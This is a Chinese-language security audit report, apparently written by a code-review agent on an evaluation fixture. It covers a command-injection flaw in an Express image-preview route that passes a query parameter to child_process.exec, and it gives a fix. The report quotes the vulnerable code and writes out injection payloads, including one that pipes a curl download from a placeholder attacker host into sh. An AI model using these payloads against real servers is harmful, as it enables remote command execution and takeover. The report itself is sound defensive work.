# 安全审查报告

## ⚙️ 审查配置快照

- 生成时间：2026-09-24
- 审查类型：存量全量
- 审查模式：security（语言 frontend / Node）
- 审查范围：/Users/jiangkun/Documents/workspace/cc-code-reviewer/tests/evals/node-security/command-injection/vulnerable（全部生产源码）
- 审查基准路径：tests/evals/node-security/command-injection/vulnerable
- 检测到的技术栈：Node.js（CommonJS，express ^4.18.0，main=server.js）
- 启用维度：1、4（配置安全子项）、5（注入/越权子项）、6（全深度）、9（敏感信息泄露子项）、11（鉴权/错误信息子项）
- 跳过维度：2、3、7、8、10、12（security 模式矩阵）
- 项目 ignore 状态：未配置
- 文件覆盖率：2/2（server.js、package.json，均已逐文件通读）
- 冻结适用控制：/tmp/cc-eval-20260923/artifacts/command-injection-vulnerable.controls.json（11 条适用 / 1 条排除）
- Node 攻击面索引：/tmp/cc-eval-20260923/artifacts/command-injection-vulnerable.surface.json（仅导航候选，未当作发现清单）
- 语义增强：未注入（无 LSP）；本轮为静态逐文件精读 + 攻击面索引交叉核对

## 📊 执行摘要

- 整体结论：单路由 Express 图片预览服务存在证据完全闭合的命令注入（任意命令执行/RCE），必须阻断发布。
- 最高风险点：`GET /api/preview` 的 `file` 查询参数未经任何校验直接拼接进 `child_process.exec` 的 shell 命令行，且端点无认证、匿名可达。
- 安全性评分：1/10（事故级 RCE，零前置条件）；可维护性 4/10；性能与技术债不评（security 模式边界）。
- 问题汇总：P0 = 1；P1 = 0；P2 = 0；P3 = 0；待确认 = 1；总计正式问题 1 条。
- 项目 ignore 命中统计：未配置，无过滤。

## 📋 覆盖情况

- 已审文件 2/2：`server.js`（17 行，全文精读）、`package.json`（依赖与入口核对）。
- 未纳入范围：项目内不存在测试、构建配置、CI/容器文件；无 `node_modules`、无 lockfile（见待确认-1）。

## 🔐 授权面覆盖（仅 Security 模式强制）

- 授权面台账：共 1 行；已绑定 0 / 未绑定 0 / 外部证据缺失 0 / 不适用 1（0 + 0 + 0 + 1 = 1）。

| 入口 | 主体与可信来源 | 动作 | 资源/属性与标识来源 | 授权决策及执行点 | 最终 Sink | 绑定结论 | 替代入口 |
|---|---|---|---|---|---|---|---|
| GET /api/preview（server.js:8 注册；server.js:17 app.listen(3000) 装配） | 无主体模型：无认证中间件、无 session/JWT、无网关注入身份头 | 触发服务端外部命令（ImageMagick convert）并写 /tmp/preview.png | req.query.file（客户端任意字符串） | 不存在（代码内无任何授权决策点可引用） | child_process.exec（server.js:11） | 不适用：仓库内不存在主体/对象/租户模型，无"入口×受保护动作"授权语义可判定；匿名可达性已并入 P0-1 证据 | 无（全仓库仅此一路由，无缓存/异步任务/RPC/消息/旧版本入口） |

- 已验证反例：同角色异对象、低权限高功能、跨租户/组织、对象属性越权、批量与嵌套资源五类均因"无主体与对象模型"不适用（证据：server.js 全文无 user/tenant/role/session/数据库符号）；替代执行路径已逐一核对（无缓存命中、异步任务、内部 RPC、导出下载、旧版本接口）。
- 未闭合入口与外部依赖：无（入口注册与端口监听均在仓库内闭合，生产可达性不依赖外部部署假设）。

## 🔴 P0 严重问题

> P0 五项硬门槛逐项核对：生产可达（路由注册 server.js:8 + `app.listen(3000)` server.js:17，入口装配仓库内闭合）✓；证据完整且置信度高（Source→Propagation→Sink→缺失控制全链静态闭合）✓；事故级影响（任意命令执行/RCE）✓；缺少有效防护（无认证、无校验、无命令白名单）✓；必须阻断发布 ✓。按「注入与 RCE 直通定级」规则，证据闭合即 P0，不得降级。

### P0-1 | [维度6-安全] req.query.file 拼接进 exec 命令行导致任意命令执行（RCE）

**位置**：server.js:11（Source 位于 server.js:9；同类问题共 1 处）

**置信度**：高 | **所属维度**：维度6-安全

**问题**：用户可控查询参数 `file` 经字符串拼接进入 `child_process.exec` 的 shell 命令行，攻击者以 `;`、`$()`、反引号等 shell 元字符逃逸即可执行任意命令。

**证据**：
```js
const { exec } = require('child_process');   // ← 引入 shell 执行 API（exec 系走 /bin/sh -c 解释整串）
app.get('/api/preview', (req, res) => {
  const file = req.query.file;               // ← Source：客户端完全可控，无任何校验/白名单
  exec('convert ' + file + ' -resize 300x300 /tmp/preview.png', (err) => {  // ← Sink：拼接串整体交给 shell 解释
```

**Source→Propagation→Sink→Missing Control 证据链**（逐项引用文件:行号）：
- Entry：`GET /api/preview`（server.js:8 路由注册；server.js:17 `app.listen(3000)` 完成入口装配，生产可达性仓库内闭合；路由无任何认证/鉴权中间件）。
- Source：`req.query.file`（server.js:9，查询参数，客户端任意字符串）。
- Propagation：`'convert ' + file + ' -resize 300x300 /tmp/preview.png'`（server.js:11，无转义、无 schema 校验、无 basename/白名单收敛）。
- Sink：`exec(命令串, 回调)`（server.js:11；exec 系列以 `/bin/sh -c` 解释整串命令，`;`/`$()`/反引号均生效）。
- Missing Control：全仓库（2 个文件均已核对）无 execFile 数组传参、未关闭 shell、无命令/参数白名单、无输入 schema 校验、无输入目录限定、无认证。

**安全规则 ID**：CCR-NODE-CMD-001

**标准映射**：OWASP A05:2025 / API10:2023 / ASVS v5.0.0-V1.2.5 / CWE-78

**检测方式**：pattern

**证据状态**：静态已证实（入口、Source、传播、Sink、控制缺失五要素全部在当前仓库闭合，不依赖网关/运行配置等外部证据）

**主体/资源/决策链**：不适用（非授权越权类条目——代码中不存在主体/会话/对象模型；攻击路径为匿名输入直达命令执行 Sink）

**未授权路径与防护**：匿名用户请求 `GET /api/preview?file=x.png;id`（或 `?file=$(curl 攻击者地址|sh)`、反引号变体）→ exec 以服务进程权限执行任意命令。现有防护：无（无认证中间件、无输入校验、无命令白名单、无沙箱/降权运行证据）。

**影响**：任意命令执行＝服务器完全接管——读取/篡改服务器任意文件（源码、凭据、密钥）、以服务身份横向移动、植入持久化后门、破坏数据；输入路径同时未限定目录，任意路径文件可被指定为 convert 输入；端点匿名可达使利用零前置条件；共享输出 `/tmp/preview.png` 会被并发请求相互覆盖。事故级，必须阻断发布。

**建议**：
1. 改用 `execFile`（或无 `shell` 选项的 `spawn`）+ 数组传参，命令名硬编码，杜绝整串进 shell：
```js
const { execFile } = require('child_process');
const path = require('path');
const UPLOAD_ROOT = '/data/uploads';                          // 唯一允许的输入目录
const safeName = path.basename(String(req.query.file || '')); // ← 剥离目录段，杜绝 ../ 与 shell 元字符
const abs = path.resolve(UPLOAD_ROOT, safeName);
if (!abs.startsWith(UPLOAD_ROOT + path.sep)) {                // ← 双保险：resolve 后根前缀校验
  return res.status(400).json({ error: 'invalid_file' });
}
execFile('convert', [abs, '-resize', '300x300', '/tmp/preview.png'], (err) => {
  if (err) return res.status(500).json({ error: 'convert_failed' });
  res.json({ preview: '/tmp/preview.png' });
});
```
2. 对 `file` 增加扩展名白名单（png/jpg/webp）与长度上限（入口 schema 校验）。
3. 为端点补充认证与限流；输出文件名追加随机后缀，避免并发覆盖。

**验证方案**：静态已证实，无需运行复现即可定级；修复后回归——测试环境请求 `?file=a.png;id` 应返回 400 `invalid_file` 且无命令执行（可加单测断言 execFile 收到数组参数）。

---

## 🟠 P1 重要问题

本次未发现 P1 问题。

## 🟡 P2 一般问题

本次未发现 P2 问题。

## 🔵 P3 建议

本次未发现 P3 问题。

## ⚪ 待确认项

### 待确认-1 | [维度6-安全] 无 lockfile，express 实际锁定版本未知

**位置**：package.json:8（`"express": "^4.18.0"`）

**置信度**：低 | **所属维度**：维度6-安全（供应链 A03 交叉项；非控制对应问题，无安全规则 ID）

**依据**：
```json
"dependencies": {
  "express": "^4.18.0"    // ← 仅范围版本，仓库内无 package-lock.json / npm-shrinkwrap.json
}
```

**待确认原因**：依赖风险结论规则要求 lockfile 版本明确且证据可靠才能形成确定性漏洞结论；当前无法得知实际安装版本，无法判定是否落在 express 已知漏洞版本区间，也无法审计安装脚本（postinstall）面。

**证据状态**：待确认项（缺失证据在仓库外——实际安装树与构建环境）

**主体/资源/决策链**：不适用（供应链完整性事项，不涉及主体—资源关系）

**未授权路径与防护**：不适用

**建议的验证方式（验证方案）**：在构建环境执行 `npm ci` 生成并提交 package-lock.json，以 `npm audit --json` 比对已知通告；CI 固化 `npm ci` 安装口径后此项即可关闭。

## 🛡️ Security 控制覆盖（仅 Security 模式强制）

- 适用控制：11
- 已发现问题：1
- 已检查无发现：10
- 外部证据缺失：0
- 静态不可验证：0
- 不适用：1
- 对账：N = A + B + C + D → 11 = 1 + 10 + 0 + 0

| 控制 ID | 标题 | 标准映射 | 检测方式 | 状态 | 证据或限制 |
|---|---|---|---|---|---|
| CCR-NODE-IDENTITY-001 | 客户端字段覆盖服务端身份或租户上下文 | OWASP A01:2025 / A07:2025 / API3:2023 / ASVS v5.0.0-V4.1.3 / v5.0.0-V8.4.1 / CWE-285 | taint | checked_no_finding | 全仓库无身份/租户上下文构造：无 ctx.user/tenant 赋值，req.query/headers 无字段进入任何身份对象（server.js 全文精读） |
| CCR-NODE-SESSION-001 | 请求对象批量写入 Session（mass assignment） | OWASP A08:2025 / API3:2023 / ASVS v5.0.0-V8.2.3 / CWE-915 | pattern | checked_no_finding | 无会话机制：依赖仅 express（package.json:8），代码内无 express-session、无 req.session 读写 |
| CCR-NODE-SSRF-001 | 用户可控数据进入服务端外发请求目标 | OWASP A01:2025 / API7:2023 / API10:2023 / ASVS v5.0.0-V1.3.6 / CWE-918 | taint | checked_no_finding | 无出站 HTTP 客户端：代码内无 fetch/axios/got/http.request/https.request；攻击面索引 outbound_clients 为空 |
| CCR-NODE-CMD-001 | 用户输入进入 child_process 命令执行 | OWASP A05:2025 / API10:2023 / ASVS v5.0.0-V1.2.5 / CWE-78 | pattern | finding_confirmed | 见 P0-1：server.js:9 req.query.file → server.js:11 字符串拼接进 exec，Entry/Source/Propagation/Sink/Missing Control 五要素闭合，无 execFile 数组参数、无白名单 |
| CCR-NODE-PATH-001 | 用户输入进入文件读取/下载路径 | OWASP A01:2025 / API8:2023 / ASVS v5.0.0-V5.3.2 / v5.0.0-V5.4.1 / CWE-22 | taint | checked_no_finding | 代码内无 fs.readFile/createReadStream、无 res.sendFile/download；用户可控路径仅进入 convert 命令行，任意文件读写风险已由 CCR-NODE-CMD-001（P0-1）承载并定级 |
| CCR-NODE-PROTO-001 | 原型污染危险键进入深合并 | OWASP A05:2025 / API3:2023 / ASVS v5.0.0-V1.3.3 / CWE-1321 | pattern | checked_no_finding | 无深合并/递归 assign/lodash.merge；未启用 body 解析器（无 express.json/urlencoded），请求对象不进入任何对象合并 |
| CCR-NODE-NOSQL-001 | 未过滤对象进入 NoSQL 查询 | OWASP A05:2025 / ASVS v5.0.0-V1.2.4 / CWE-943 | taint | checked_no_finding | 无 Mongo/Mongoose：依赖清单仅 express（package.json:7-9），无任何数据库客户端与查询构造 |
| CCR-NODE-DESER-001 | 不可信数据进入危险反序列化 | OWASP A08:2025 / API8:2023 / ASVS v5.0.0-V1.5.2 / CWE-502 | pattern | checked_no_finding | 无 node-serialize/serialize-javascript/yaml.load；跨边界仅 JSON 响应输出，无反序列化入口 |
| CCR-NODE-BOLA-001 | 主体—对象绑定缺失（水平越权/BOLA） | OWASP A01:2025 / API1:2023 / ASVS v5.0.0-V8.2.2 / v5.0.0-V8.3.3 / CWE-639 | semantic | checked_no_finding | 无对象存储与主体模型：无按 ID 定位的资源读写（无数据库/对象仓库），同角色异对象反例无对象可替换；唯一入口的实质风险由 P0-1 承载 |
| CCR-NODE-BFLA-001 | 低权限主体可执行高权限动作（垂直越权/BFLA） | OWASP A01:2025 / API5:2023 / ASVS v5.0.0-V8.2.1 / CWE-285 | semantic | checked_no_finding | 无角色/权限分层与管理动作：唯一路由即业务功能本身，代码内不存在 admin/config/export 类高权限动作与可比对的低权限主体；端点匿名可达已在 P0-1 作为攻击放大条件披露 |
| CCR-NODE-CSRF-001 | Cookie 会话写接口缺少 CSRF 控制 | OWASP A01:2025 / API8:2023 / ASVS v5.0.0-V3.3.2 / v5.0.0-V3.5.2 / CWE-352 | config | checked_no_finding | 无 Cookie 会话：未启用 express-session/cookie-parser，不存在可被跨站骑乘的浏览器环境凭据，豁免证据见 server.js 全文与 package.json 依赖清单；端点匿名暴露已在 P0-1 披露，不构成 CSRF 语义 |

排除控制说明：CCR-NODE-BFFHEADER-001（客户端请求头批量透传到上游服务）由 resolver 按冻结 profile（node-api）排除，计入"不适用"（E=1）；本轮代码证据未发现语义提升条件——仓库内不存在任何出站代理或上游请求头构造（无 outbound client），无需提升为 finding_confirmed。

## ✅ 最佳实践亮点

错误响应未回显原始异常与堆栈（server.js:12 仅返回 `convert_failed` 常量），未发现其他足够稳定且值得单独表扬的安全实践。

## 🔍 覆盖限制与未审查范围

- 已重点检查：唯一入口的完整污点链（query → exec）、入口装配与生产可达性、认证/会话/身份模型存在性、全部 11 条适用控制的证据面。
- 未充分覆盖：依赖实际锁定版本（无 lockfile，见待确认-1）；ImageMagick `convert` 二进制自身的安全配置（服务器环境，仓库内无证据，且该风险被命令注入修复后消解）。
- 限制说明：静态审查，未执行任何网络请求或运行时验证；`static_unsupported` 计数为 0，本轮所有适用控制均以静态证据闭合结论。

## 🎯 修复优先级

- P0 - 立即修复：P0-1 命令注入（execFile 数组参数 + basename/根前缀校验 + 扩展名白名单 + 认证限流）
- P1 - 尽快修复：无
- P2 - 计划修复：无
- P3 - 可选优化：无

## 📝 总结

- 一句话架构判断：单路由 Express 工具型服务把客户端输入直接绑定到 shell 执行，是教科书式命令注入形态。
- 本次模式核心判断：security 全深度审查下，11 条适用控制中 1 条 finding_confirmed（CCR-NODE-CMD-001），证据链完全闭合，事故级 RCE，阻断发布。
- 3 个关键行动项：1) 立即以 execFile + 数组参数替换 exec 拼接（见 P0-1 修复片段）；2) 输入侧加 basename + 目录根前缀校验 + 扩展名白名单；3) 提交 lockfile 并在 CI 固化 npm ci（关闭待确认-1）。

**审查人**: cc-code-reviewer Agent
**报告版本**: 5.7
**审查模式**: security
**模型档位**: inherit
